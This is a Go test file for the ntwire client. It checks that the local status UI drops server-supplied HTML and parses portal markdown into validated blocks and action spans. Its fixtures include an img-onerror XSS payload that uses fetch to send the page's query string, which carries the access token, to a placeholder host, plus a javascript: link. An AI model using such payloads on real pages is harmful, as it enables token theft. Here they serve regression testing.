package client

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/nmaguiar/ntwire/pkg/portal"
	"github.com/nmaguiar/ntwire/pkg/protocol"
)

// hostilePortalServer serves a /v1/portal response whose HTML field carries
// markup the server never produced through RenderMarkdown at all -- the case a
// server-side sanitizer cannot help with.
func hostilePortalServer(t *testing.T) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("GET /v1/portal", func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(portal.RenderedPortal{
			Title:    "Portal",
			Markdown: "# Portal\n\nPlain text only.\n",
			HTML:     `<img src=x onerror="fetch('http://127.0.0.1:1/'+location.search)">`,
			Context:  &portal.PortalContext{Portal: portal.PortalInfo{Title: "Portal"}},
		})
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv
}

// TestLocalPortalEndpointDropsServerHTML is the regression test for the client
// trusting server-rendered HTML: the status UI used to assign
// RenderedPortal.HTML straight into innerHTML, in the origin whose URL carries
// the UI's own access token. The local endpoint must serve parsed blocks and
// must not pass the server's HTML through at all.
func TestLocalPortalEndpointDropsServerHTML(t *testing.T) {
	srv := hostilePortalServer(t)
	conn := &Connection{
		base:     srv.URL,
		token:    "t",
		http:     srv.Client(),
		Response: protocol.AuthResponse{PortalEnabled: true},
	}

	p, err := conn.Portal(t.Context())
	if err != nil {
		t.Fatalf("fetch portal: %v", err)
	}

	body, err := json.Marshal(WebPortal{Title: p.Title, Blocks: parsePortalBlocks(p.Markdown)})
	if err != nil {
		t.Fatal(err)
	}
	payload := string(body)
	if strings.Contains(payload, "onerror") || strings.Contains(payload, "<img") {
		t.Fatalf("server HTML reached the local status UI: %s", payload)
	}

	var got WebPortal
	if err := json.Unmarshal(body, &got); err != nil {
		t.Fatal(err)
	}
	if len(got.Blocks) == 0 {
		t.Fatal("the portal Markdown should still render as blocks")
	}
	for _, b := range got.Blocks {
		if b.Type != "heading" && b.Type != "paragraph" {
			t.Fatalf("unexpected block type %q", b.Type)
		}
	}
}

// TestPortalActionSpansAreParsed checks that ntwire:// action links survive the
// move to blocks, so the Portal tab keeps its buttons. They arrive as typed
// action spans -- already parsed and validated -- rather than as markup the UI
// would have to trust.
func TestPortalActionSpansAreParsed(t *testing.T) {
	blocks := parsePortalBlocks("- [Open Grafana](ntwire://open/grafana)\n- [Bad](ntwire://evil/x)\n- [Nope](javascript:alert(1))\n")
	var actions, links, texts int
	for _, b := range blocks {
		for _, item := range b.Items {
			for _, sp := range item {
				switch sp.Type {
				case "action":
					actions++
					if sp.Action != "open" || sp.Target != "grafana" {
						t.Fatalf("unexpected action span %+v", sp)
					}
				case "link":
					links++
				default:
					texts++
				}
			}
		}
	}
	if actions != 1 {
		t.Fatalf("want exactly one action span, got %d", actions)
	}
	if links != 0 {
		t.Fatalf("an unsupported scheme must not become a link, got %d", links)
	}
	if texts == 0 {
		t.Fatal("rejected links should fall back to literal text")
	}
}
